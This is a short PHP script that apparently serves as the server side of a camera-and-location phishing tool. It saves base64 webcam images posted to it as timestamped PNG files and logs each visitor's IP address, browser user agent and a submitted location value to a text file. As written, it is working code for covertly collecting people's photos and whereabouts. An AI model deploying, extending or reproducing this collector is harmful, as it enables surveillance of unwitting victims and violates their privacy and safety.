<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $img = file_get_contents('php://input');
    $img = str_replace('data:image/png;base64,', '', $img);
    $img = str_replace(' ', '+', $img);
    file_put_contents('cam_' . date('His') . '.png', base64_decode($img));
}

if (isset($_GET['type']) && $_GET['type'] == 'loc') {
    $val = $_GET['val'];
    // Format: Time | IP | Device | Loc
    $log = date('H:i:s') . " | IP: $ip | Device: $ua | Loc: $val\n";
    file_put_contents("logs.txt", $log, FILE_APPEND);
}
?>
